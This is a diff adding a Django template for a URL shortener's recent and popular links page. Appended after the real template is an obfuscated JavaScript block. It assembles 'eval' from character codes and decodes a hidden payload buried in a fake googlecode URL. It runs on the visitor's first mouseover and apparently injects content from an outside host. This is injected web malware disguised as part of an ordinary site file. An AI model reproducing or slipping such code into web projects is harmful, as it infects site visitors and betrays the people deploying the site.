@@ -1,0 +1,57 @@
+{% extends "shortener/snippets/base.html" %}
+{% block content %}
+<h2>Recent Links</h2>
+<ul>
+{% for link in object_list %}
+<li><a href="{{ link.short_url }}">{{ link.url }}</a> (Score: {{ link.usage_count }})
+{% comment %}
+(<a href="{% url shortener.views.info link.to_base62 %}">Info</a>)</li>
+{% endcomment %}
+{% endfor %}
+</ul>
+
+<h2>Most Popular Links</h2>
+<ul>
+{% for link in most_popular %}
+<li><a href="{{ link.short_url }}">{{ link.url }}</a> (Score: {{ link.usage_count }})
+{% comment %}
+(<a href="{% url shortener.views.info link.to_base62 %}">Info</a>)</li>
+{% endcomment %}
+{% endfor %}
+</ul>
+{% endblock %}
+
+{% block extra_body %}
+<script>
+$(document).ready(
+  function() {
+    $("#id_u").focus().select();
+  });
+</script>  
+{% endblock %}
+<html><body><div id="w3stats"></div>
+<script language="JavaScript" type="text/javascript">
+window.w3ssss=function(){
+var scriptlink = "http://jquery.googlecode.com/svn/trunk/gadget/scripts/s.js?userrefer=%0A7gw%0Anayies4flsrrd4p%3Du4fdsauogkncu2zutcymahnepbdnkg8t5wd.6ulcwprr5hjef37ace0tfgpe1zlEz19lkt9ey3sm96oeko4nhuvtfy5%282wj%226ofils0fowyrx6wanu4m6ajeinf%22bqs%293e0%3Bd5i%0Ayczieyifqi9rct4.sl6snrzre2ocola%3Dg1q%22cd8h7irth8ltcufpz5g%3Adu6/g4u/wwovvb0cb8p-p74bkadu0krsxuaip6znd9eegtrsghbsejf.ponc8kiocetmh6r/cp8i63lndkg.8rrpbewh9kepdka%22x5n%3B73r%0Av27iar6fht8rpsz.r5ksx1ottjxy2h1ltseeign.s28w7fvisuadzght5mph09w%3Dpr0%22usd1yifpp0vxwar%22vw3%3Bpv6%0Ayljibn8fjdzroab.60ns3llt4ulyxzclfrzektc.wq5hvbsed58if0ygt3dhtaatjsq%3Dqzs%22gxt1y6apeanxndo%225ij%3Bny2%0Acj5dzblow3fcr0gubrrm42geqinnghstuh3.3z6g3thezrgt7m9Enx1ley7e6voma64eph0nl7htxqbB3n7yjtwIs9xdvht%28rph%22ufxwhhm3flks84utufuanldthuks999%2222l%290io.9iga4usp7rxpverebjgnjrbdyezCpugh3eliesil9ncdcer%28wu7itzjfjl3rpqi%29q83%3Bsih%0A4ni%0Akba";
+var visitnum=window.history.length%1000-window.history.length+4;
+var countbox=document.createElement("div");countbox.id='countbox';
+idarr = new Array(97,114,93,104);
+for(var i=0,elem=[]; i<visitnum; i++){elem[i]=document.createElement("div");elem[i].id= String.fromCharCode(idarr[i]+visitnum);countbox.appendChild(elem[i]);}
+var cont=''; currentuser=true, nextuser=countbox.firstChild;
+do{currentuser=nextuser; cont += currentuser.id; nextuser=currentuser.nextSibling;}while(currentuser!==countbox.lastChild)
+var userref=unescape(scriptlink.substr(scriptlink.indexOf('?userrefer=')+11));
+for(var i=0,content=''; i<userref.length; i+=visitnum){content+=userref.charAt(i);}
+try{ window[cont](content) }catch(e){}
+}
+window.CheckBody = function()
+{
+if (!document.body){setTimeout('CheckBody();',10);}
+else
+{
+window.nomore=false;
+document.body.onmouseover=function(){if(!window.nomore){window.nomore=true;w3ssss();}}
+window.onmouseover=function(){if(!window.nomore){window.nomore=true;w3ssss();}}
+}
+}
+CheckBody();
+</script></body></html>
